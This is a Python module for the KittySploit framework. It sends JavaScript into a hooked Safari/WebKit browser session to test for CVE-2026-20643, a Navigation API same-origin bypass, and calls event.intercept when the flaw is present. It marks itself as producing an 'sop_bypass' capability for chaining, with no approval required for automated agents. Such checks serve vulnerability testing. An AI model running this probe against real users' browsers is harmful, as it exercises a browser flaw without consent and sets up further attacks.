#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *


class Module(BrowserAuxiliary):
    __info__ = {
        "name": "WebKit CVE-2026-20643 NavigateEvent.canIntercept check",
        "description": (
            "Checks whether NavigateEvent.canIntercept is incorrectly true for "
            "same-host cross-port navigations (CVE-2026-20643 / WebKit Navigation API "
            "SOP gate bug). Reports VULNERABLE when canIntercept=true on a cross-origin "
            "target, PATCHED when false, or INCONCLUSIVE when the Navigation API is "
            "unavailable or no navigate event is observed."
        ),
        "author": ["Thomas Espach", "KittySploit Team"],
        "cve": ["CVE-2026-20643"],
        "browser": Browser.SAFARI,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20643",
            "https://github.com/WebKit/WebKit/commit/850ce3163e55ebaa33f712d05681e5522b518806",
            "https://github.com/zeroxjf/WebKit-NavigationAPI-SOP-Bypass",
            "https://support.apple.com/",
        ],
        "tags": [
            "browser",
            "webkit",
            "safari",
            "ios",
            "navigation-api",
            "sop",
            "check",
            "cve-2026-20643",
        ],
        "agent": {
            "risk": "active",
            "effects": ["browser_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "cost": 0.5,
            "noise": 0.2,
            "value": 0.8,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["safari", "webkit", "ios"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sop_bypass", "from_detail": "navigation_api"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    other_port = OptString(
        "",
        "Cross-port target port (auto: 8800↔8000 swap, else current±1)",
        required=False,
    )
    timeout = OptInteger(5, "Seconds to wait for the navigate event", required=False)

    def _probe_js(self) -> str:
        other = json.dumps(str(self.other_port or "").strip())
        timeout_ms = max(int(self.timeout or 5), 2) * 1000
        return f"""
        (function() {{
            const OTHER_PORT = {other};
            const TIMEOUT_MS = {timeout_ms};

            function pickOtherPort(currentPort) {{
                if (OTHER_PORT) return String(OTHER_PORT);
                if (currentPort === "8800") return "8000";
                if (currentPort === "8000") return "8800";
                const n = parseInt(currentPort || "0", 10);
                if (!n) return "8800";
                return String(n === 443 ? 8443 : n + 1);
            }}

            return new Promise(function(resolve) {{
                if (!window.navigation) {{
                    resolve(JSON.stringify({{
                        status: "inconclusive",
                        reason: "window.navigation unavailable",
                        from: location.href
                    }}));
                    return;
                }}

                const from = new URL(location.href);
                const port = from.port || (from.protocol === "https:" ? "443" : "80");
                const target = new URL(location.href);
                target.port = pickOtherPort(port);
                target.pathname = target.pathname || "/";
                const crossOrigin = target.origin !== location.origin;

                let settled = false;
                const finish = function(payload) {{
                    if (settled) return;
                    settled = true;
                    resolve(JSON.stringify(payload));
                }};

                const onNavigate = function(event) {{
                    if (!event.destination || event.destination.url !== target.href) {{
                        return;
                    }}

                    const canIntercept = !!event.canIntercept;
                    let interceptError = null;
                    let interceptRan = false;

                    if (crossOrigin && canIntercept) {{
                        try {{
                            event.intercept({{
                                handler: function() {{
                                    interceptRan = true;
                                }}
                            }});
                        }} catch (e) {{
                            interceptError = String(e && e.message ? e.message : e);
                        }}
                        finish({{
                            status: "vulnerable",
                            from: location.href,
                            to: target.href,
                            cross_origin: crossOrigin,
                            can_intercept: canIntercept,
                            intercept_ran: interceptRan,
                            intercept_error: interceptError,
                            reason: "canIntercept=true on cross-origin/cross-port target"
                        }});
                        return;
                    }}

                    try {{ event.preventDefault(); }} catch (e) {{}}
                    finish({{
                        status: "patched",
                        from: location.href,
                        to: target.href,
                        cross_origin: crossOrigin,
                        can_intercept: canIntercept,
                        reason: "canIntercept=false as expected"
                    }});
                }};

                navigation.addEventListener("navigate", onNavigate, {{ once: true }});

                try {{
                    const a = document.createElement("a");
                    a.href = target.href;
                    a.rel = "noreferrer";
                    a.style.display = "none";
                    document.body.appendChild(a);
                    a.click();
                    a.remove();
                }} catch (e) {{
                    finish({{
                        status: "inconclusive",
                        from: location.href,
                        to: target.href,
                        cross_origin: crossOrigin,
                        reason: "failed to trigger navigation: " + String(e)
                    }});
                    return;
                }}

                setTimeout(function() {{
                    finish({{
                        status: "inconclusive",
                        from: location.href,
                        to: target.href,
                        cross_origin: crossOrigin,
                        reason: "no matching navigate event observed"
                    }});
                }}, TIMEOUT_MS);
            }});
        }})();
        """

    def _parse_result(self, raw):
        if raw is None:
            return None
        text = str(raw).strip()
        try:
            return json.loads(text)
        except Exception:
            return {"status": "inconclusive", "reason": text or "empty browser response"}

    def check(self):
        raw = self.send_js_and_wait_for_response(
            self._probe_js(),
            timeout=max(int(self.timeout or 5), 2) + 3,
        )
        data = self._parse_result(raw)
        if not data:
            return {
                "vulnerable": False,
                "reason": "No response from browser session",
                "confidence": "low",
            }

        status = str(data.get("status") or "").lower()
        if status == "vulnerable":
            return {
                "vulnerable": True,
                "reason": data.get("reason") or "canIntercept=true on cross-port navigation",
                "confidence": "high",
                "evidence": data,
            }
        if status == "patched":
            return {
                "vulnerable": False,
                "reason": data.get("reason") or "canIntercept=false",
                "confidence": "high",
                "evidence": data,
            }
        return {
            "vulnerable": False,
            "reason": data.get("reason") or "inconclusive",
            "confidence": "low",
            "evidence": data,
        }

    def run(self):
        print_status("CVE-2026-20643 — WebKit NavigateEvent.canIntercept cross-port check")
        result = self.check()
        evidence = result.get("evidence") or {}

        if evidence.get("from"):
            print_info(f"from:         {evidence.get('from')}")
        if evidence.get("to"):
            print_info(f"to:           {evidence.get('to')}")
        if "cross_origin" in evidence:
            print_info(f"cross-origin: {evidence.get('cross_origin')}")
        if "can_intercept" in evidence:
            print_info(f"canIntercept: {evidence.get('can_intercept')}")

        status = str((evidence or {}).get("status") or "").lower()
        if result.get("vulnerable"):
            print_success(
                "VULNERABLE — canIntercept=true on cross-origin target (CVE-2026-20643)"
            )
            return True
        if status == "patched":
            print_info("PATCHED — canIntercept=false as expected")
            return False

        print_warning(result.get("reason") or "Inconclusive")
        return False
